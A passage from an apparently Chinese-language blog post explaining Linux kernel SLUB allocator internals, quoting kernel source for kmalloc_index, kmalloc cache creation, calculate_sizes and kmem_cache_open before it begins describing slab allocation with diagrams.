
<p>这样内核调用 <code>kmalloc</code>
函数时就可以根据申请的内存大小找到对应的 <code>kmalloc-xx</code>
，然后在里面找可可用的内存块。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">kmalloc_index</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!size)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line">        <span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">4</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">8</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">26</span>;</span><br><span class="line">    <span class="comment">/* Will never be reached. Needed because the compiler may complain */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></div>
<p>创建默认的 <code>kmem_cache</code> 过程存在如下调用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x86_64_start_kernel()</span><br><span class="line">    x86_64_start_reservations()</span><br><span class="line">        start_kernel()</span><br><span class="line">            mm_init()</span><br><span class="line">                kmem_cache_init()</span><br><span class="line">                    create_kmalloc_caches()</span><br><span class="line">                        new_kmalloc_cache()</span><br></pre></td></tr></table></figure></div>
<p>在 <code>new_kmalloc_cache</code> 中根据 <code>kmalloc_info</code>
的信息创建对应的 <code>kmalloc_cache</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __init</span><br><span class="line"><span class="title function_">new_kmalloc_cache</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> type, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type == KMALLOC_RECLAIM) &#123;</span><br><span class="line">		flags |= SLAB_RECLAIM_ACCOUNT;</span><br><span class="line">		name = kmalloc_cache_name(<span class="string">&quot;kmalloc-rcl&quot;</span>,</span><br><span class="line">						kmalloc_info[idx].size);</span><br><span class="line">		BUG_ON(!name);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		name = kmalloc_info[idx].name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kmalloc_caches[type][idx] = create_kmalloc_cache(name,</span><br><span class="line">					kmalloc_info[idx].size, flags, <span class="number">0</span>,</span><br><span class="line">					kmalloc_info[idx].size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里可以看到默认创建的 <code>kmem_cache</code> 的地址被保存在
<code>kmalloc_caches</code> 因此可以通过该结构获得
<code>kmem_cache</code> 的地址，从而获取到重要调试信息，比如
<code>freelist</code> 在 <code>object</code> 中的偏移
<code>offset</code> 。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8bced970f845702c22749e86041eda02.png"
                     
                      
                
                ></p>
<p><code>create_kmalloc_cache</code> 函数调用了核心函数
<code>create_boot_cache</code> ，之后 <code>list_add</code> 将创建的
<code>kmem_cache</code> 加入到 <code>slab_caches</code>
链表中。内核全局有一个 <code>slab_caches</code>
变量，它是一个链表，系统所有的 <code>kmem_cache</code>
都接在这个链表上。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> kmem_cache *__init <span class="title function_">create_kmalloc_cache</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span> =</span> kmem_cache_zalloc(kmem_cache, GFP_NOWAIT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		panic(<span class="string">&quot;Out of memory when creating slab %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">	create_boot_cache(s, name, size, flags, useroffset, usersize);</span><br><span class="line">	list_add(&amp;s-&gt;<span class="built_in">list</span>, &amp;slab_caches);</span><br><span class="line">	memcg_link_cache(s);</span><br><span class="line">	s-&gt;refcount = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>create_boot_cache</code> 初始化了相关信息，之后调用
<code>__kmem_cache_create</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">create_boot_cache</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">slab_flags_t</span> flags,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> useroffset, <span class="type">unsigned</span> <span class="type">int</span> usersize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	s-&gt;name = name;</span><br><span class="line">	s-&gt;size = s-&gt;object_size = size;</span><br><span class="line">	s-&gt;align = calculate_alignment(flags, ARCH_KMALLOC_MINALIGN, size);</span><br><span class="line">	s-&gt;useroffset = useroffset;</span><br><span class="line">	s-&gt;usersize = usersize;</span><br><span class="line"></span><br><span class="line">	slab_init_memcg_params(s);</span><br><span class="line"></span><br><span class="line">	err = __kmem_cache_create(s, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		panic(<span class="string">&quot;Creation of kmalloc slab %s size=%u failed. Reason %d\n&quot;</span>,</span><br><span class="line">					name, size, err);</span><br><span class="line"></span><br><span class="line">	s-&gt;refcount = <span class="number">-1</span>;	<span class="comment">/* Exempt from merging for now */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>__kmem_cache_create</code> 调用了 <code>kmem_cache_open</code>
函数，该函数做了很多重要的初始化操作。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * calculate_sizes() determines the order and the distribution of data within</span></span><br><span class="line"><span class="comment"> * a slab object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">calculate_sizes</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">int</span> forced_order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size = s-&gt;object_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> order;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Round up object size to the next word boundary. We can only</span></span><br><span class="line"><span class="comment">	 * place the free pointer at word boundaries and this determines</span></span><br><span class="line"><span class="comment">	 * the possible location of the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, <span class="keyword">sizeof</span>(<span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine if we can poison the object itself. If the user of</span></span><br><span class="line"><span class="comment">	 * the slab may touch the object after free or before allocation</span></span><br><span class="line"><span class="comment">	 * then we should never poison the object itself.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_POISON) &amp;&amp; !(flags &amp; SLAB_TYPESAFE_BY_RCU) &amp;&amp;</span><br><span class="line">			!s-&gt;ctor)</span><br><span class="line">		s-&gt;flags |= __OBJECT_POISON;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		s-&gt;flags &amp;= ~__OBJECT_POISON;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we are Redzoning then check if there is some space between the</span></span><br><span class="line"><span class="comment">	 * end of the object and the free pointer. If not then add an</span></span><br><span class="line"><span class="comment">	 * additional word to have some bytes to store Redzone information.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SLAB_RED_ZONE) &amp;&amp; size == s-&gt;object_size)</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * With that we have determined the number of bytes in actual use</span></span><br><span class="line"><span class="comment">	 * by the object. This is the potential offset to the free pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;inuse = size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (((flags &amp; (SLAB_TYPESAFE_BY_RCU | SLAB_POISON)) ||</span><br><span class="line">		s-&gt;ctor)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Relocate free pointer after the object if it is not</span></span><br><span class="line"><span class="comment">		 * permitted to overwrite the first word of the object on</span></span><br><span class="line"><span class="comment">		 * kmem_cache_free.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * This is the case if we do RCU, have a constructor or</span></span><br><span class="line"><span class="comment">		 * destructor or are poisoning the objects.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		s-&gt;offset = size;</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_STORE_USER)</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Need to store information about allocs and frees after</span></span><br><span class="line"><span class="comment">		 * the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> track);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	kasan_cache_create(s, &amp;size, &amp;s-&gt;flags);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_RED_ZONE) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Add some empty padding so that we can catch</span></span><br><span class="line"><span class="comment">		 * overwrites from earlier objects rather than let</span></span><br><span class="line"><span class="comment">		 * tracking information or the free pointer be</span></span><br><span class="line"><span class="comment">		 * corrupted if a user writes before the start</span></span><br><span class="line"><span class="comment">		 * of the object.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line">		s-&gt;red_left_pad = <span class="keyword">sizeof</span>(<span class="type">void</span> *);</span><br><span class="line">		s-&gt;red_left_pad = ALIGN(s-&gt;red_left_pad, s-&gt;align);</span><br><span class="line">		size += s-&gt;red_left_pad;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SLUB stores one object immediately after another beginning from</span></span><br><span class="line"><span class="comment">	 * offset 0. In order to align the objects we have to simply size</span></span><br><span class="line"><span class="comment">	 * each object to conform to the alignment.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	size = ALIGN(size, s-&gt;align);</span><br><span class="line">	s-&gt;size = size;</span><br><span class="line">	<span class="keyword">if</span> (forced_order &gt;= <span class="number">0</span>)</span><br><span class="line">		order = forced_order;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		order = calculate_order(size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (order)</span><br><span class="line">		s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">		s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">		s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s-&gt;oo = oo_make(order, size);</span><br><span class="line">	s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line">	<span class="keyword">if</span> (oo_objects(s-&gt;oo) &gt; oo_objects(s-&gt;max))</span><br><span class="line">		s-&gt;max = s-&gt;oo;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	<span class="keyword">if</span> (disable_higher_order_debug) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Disable debugging flags that store metadata if the min slab</span></span><br><span class="line"><span class="comment">		 * order increased.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (get_order(s-&gt;size) &gt; get_order(s-&gt;object_size)) &#123;</span><br><span class="line">			s-&gt;flags &amp;= ~DEBUG_METADATA_FLAGS;</span><br><span class="line">			s-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">				<span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \</span></span><br><span class="line"><span class="meta">    defined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE)</span></span><br><span class="line">	<span class="keyword">if</span> (system_has_cmpxchg_double() &amp;&amp; (s-&gt;flags &amp; SLAB_NO_CMPXCHG) == <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* Enable fast mode */</span></span><br><span class="line">		s-&gt;flags |= __CMPXCHG_DOUBLE;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The larger the object size is, the more pages we want on the partial</span></span><br><span class="line"><span class="comment">	 * list to avoid pounding the page allocator excessively.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	set_min_partial(s, ilog2(s-&gt;size) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	set_cpu_partial(s);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	s-&gt;remote_node_defrag_ratio = <span class="number">1000</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initialize the pre-computed randomized freelist if slab is up */</span></span><br><span class="line">	<span class="keyword">if</span> (slab_state &gt;= UP) &#123;</span><br><span class="line">		<span class="keyword">if</span> (init_cache_random_seq(s))</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!init_kmem_cache_nodes(s))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (alloc_kmem_cache_cpus(s))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	free_kmem_cache_nodes(s);</span><br><span class="line">error:</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_PANIC)</span><br><span class="line">		panic(<span class="string">&quot;Cannot create slab %s size=%u realsize=%u order=%u offset=%u flags=%lx\n&quot;</span>,</span><br><span class="line">		      s-&gt;name, s-&gt;size, s-&gt;size,</span><br><span class="line">		      oo_order(s-&gt;oo), s-&gt;offset, (<span class="type">unsigned</span> <span class="type">long</span>)flags);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="slub-分配">slub 分配</h4>
<figure>
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f7f490f6f668b542aab003ec27135ad2.png"
                     
                      alt="2.png" 
                
                >
<figcaption aria-hidden="true">2.png</figcaption>
</figure>
<ul>
<li><p>kmem_cache
刚刚建立，还没有任何对象可供分配，此时只能从伙伴系统分配一个 slab
，如下图所示。<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/244cd82a22db3cb5168651580d622465.png"
                     
                     
alt="3.png" 
                
                ></p></li>
<li><p>如果正在使用的 slab 有 free
obj，那么就直接分配即可，这种是最简单快捷的。如下图所示。<img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/df0e27a7cc01c0a1ab1b387409d7b8a4.png"
                     
                     
alt="4.png" 
                
                ></p></li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj
